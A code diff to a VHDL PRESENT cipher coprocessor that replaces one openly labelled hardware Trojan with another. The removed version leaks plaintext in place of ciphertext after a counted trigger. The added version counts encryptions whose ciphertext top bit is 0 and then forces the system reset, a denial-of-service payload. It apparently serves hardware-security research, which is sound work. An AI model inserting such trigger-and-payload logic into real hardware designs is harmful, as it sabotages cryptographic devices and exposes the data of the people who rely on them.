@@ -2,27 +2,25 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 7: trigger = Timebomb which triggers after each (2^k)-1 events of 
--- ciphertext(43 downto 40) = data_in(59 downto 56), i.e. when 4 specific bits of the
--- computed ciphertext are equal to 4 specific bits of the input data AND the current operation is 
--- an encryption
--- payload = ovewrite computer ciphertext with input data (plaintext)
+-- Trojan 9: trigger = Asynchronous Timebomb which triggers after (2^k)-1 encryptions where
+-- the MSBit of the computed ciphertext is equal to 0
+-- payload = Denial of Service attack by raising the system's reset signal
 
-entity present_Trojan7 is
+entity present_Trojan9 is
         port (
-                clk      : in std_logic;
-                rst      : in std_logic;
-                ena      : in std_logic;
+                clk             : in std_logic;
+                rst             : in std_logic;
+                ena             : in std_logic;
 
-                mode_sel : in std_logic_vector(1 downto 0);
-                key      : in std_logic_vector(127 downto 0);
-                data_in  : in std_logic_vector(63 downto 0);
-                data_out : out std_logic_vector(63 downto 0);
-                ready    : out std_logic
+                mode_sel        : in std_logic_vector(1 downto 0);
+                key             : in std_logic_vector(127 downto 0);
+                data_in         : in std_logic_vector(63 downto 0);
+                data_out        : out std_logic_vector(63 downto 0);
+                ready           : out std_logic
         );
-end entity present_Trojan7;
+end entity present_Trojan9;
 
-architecture rtl of present_Trojan7 is
+architecture rtl of present_Trojan9 is
         signal  key_sched_out,
                 key_mem_out : std_logic_vector(63 downto 0);
 
@@ -36,24 +34,23 @@ architecture rtl of present_Trojan7 is
 
         signal  ciphertext,
                 plaintext,
-                mux_out : std_logic_vector(63 downto 0);
+                mux_out,
+                reg_out : std_logic_vector(63 downto 0);
 
         signal  key_sched_ena,
                 out_ena,
-                load_ena        : std_logic;
+                load_ena : std_logic;
 
         signal  ready_cu : std_logic;
 
+        constant TROJAN_COUNTER_WIDTH     : natural := 8; -- testing value, not final
+        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');
+
         signal  trojan_trig,
-                trojan_counter_rst,
+                trojan_sys_rst,
                 trojan_counter_event : std_logic;
 
-        constant TROJAN_COUNTER_WIDTH : natural := 2; -- final trojan counter width value ?
-
-        signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH-1 downto 0);
-        signal  trojan_mux_out : std_logic_vector(63 downto 0);
-
-        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');
+        signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0);
 begin
         -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
         -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
@@ -61,9 +58,9 @@ begin
         control_unit : entity work.present_control_unit
                 port map(
                         -- inputs
-                        clk      => clk,
-                        rst      => rst,
-                        ena      => ena,
+                        clk    => clk,
+                        rst    => trojan_sys_rst,
+                        ena    => ena,
                         op_sel => mode_sel(0),
 
                         round_counter_val => current_round,
@@ -83,7 +80,7 @@ begin
         key_sched : entity work.key_schedule_top
                 port map(
                         clk               => clk,
-                        rst               => rst,
+                        rst               => trojan_sys_rst,
                         ena               => key_sched_ena,
                         mode              => mode_sel(1),
                         input_key         => key,
@@ -103,7 +100,7 @@ begin
         enc_dp : entity work.present_enc
                 port map(
                         clk        => clk,
-                        rst        => rst,
+                        rst        => trojan_sys_rst,
                         ena        => enc_ena,
                         load_ena   => load_ena,
                         plaintext  => data_in,
@@ -114,32 +111,13 @@ begin
         dec_dp : entity work.present_dec
                 port map(
                         clk        => clk,
-                        rst        => rst,
+                        rst        => trojan_sys_rst,
                         ena        => dec_ena,
                         load_ena   => load_ena,
                         ciphertext => data_in,
                         round_key  => key_mem_out,
                         plaintext  => plaintext
                 );
-
-        trojan_counter_event <= '1' when (ciphertext(43 downto 40) = data_in(59 downto 56) and mode_sel(0) = '0') else '0';
-        
-        trojan_counter_rst <= '1' when (rst = '1' or (trojan_trig = '1' and ready_cu = '1')) else '0';        
-
-        -- trojan timebomb's counter
-        trojan_counter : entity work.counter
-                generic map(
-                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
-                )
-                port map(
-                        clk => trojan_counter_event,  -- asynchronous -> count number of specified events
-                        cnt_ena => out_ena,           -- count when the final ciphertext is computed
-                        rst => trojan_counter_rst,                        
-                        count => trojan_counter_out                        
-                );
-        
-        -- the Trojan triggers when its counter reaches its max value
-        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
 
         -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
         -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
@@ -154,20 +132,30 @@ begin
                         sel     => dec_ena,
                         mux_out => mux_out
                 );
-        
-        -- trojan multiplexer : when the Trojan is inactive, the mux forwards the output data of the
-        -- encryption/decryption datapath, but when the trojan gets triggered, the mux passes the 
-        -- input data to its output.
-        trojan_mux : entity work.mux
+
+        trojan_counter_event <= '1' when (ciphertext(63) = '0' and out_ena = '1') else '0';
+
+        -- trojan counter
+        trojan_counter : entity work.counter
                 generic map(
-                        DATA_WIDTH => 64
+                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
                 )
                 port map(
-                        input_A => mux_out,
-                        input_B => data_in,                        
-                        sel => trojan_trig,
-                        mux_out => trojan_mux_out
+                        clk     => trojan_counter_event,
+                        cnt_ena => out_ena,
+                        rst     => rst,
+                        count   => trojan_counter_out
                 );
+
+        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
+
+        -- payload XOR
+        trojan_xor : entity work.xor_2
+                port map(
+                        a => trojan_trig,
+                        b => rst,
+                        y => trojan_sys_rst
+                );        
 
         -- Coprocessor-global output register, in order to preserve the computed output data,
         -- until new ones are available. This can be helpful when a device reading from
@@ -177,10 +165,11 @@ begin
                         DATA_WIDTH => 64
                 )
                 port map(
-                        clk  => clk,
+                        clk => clk,
                         ena  => out_ena,
-                        rst  => rst,                        
-                        din  => trojan_mux_out,
-                        dout => data_out
-                );                 
+                        rst  => trojan_sys_rst,
+                        din  => mux_out,
+                        dout => reg_out
+                );
+        data_out <= reg_out;
 end architecture;
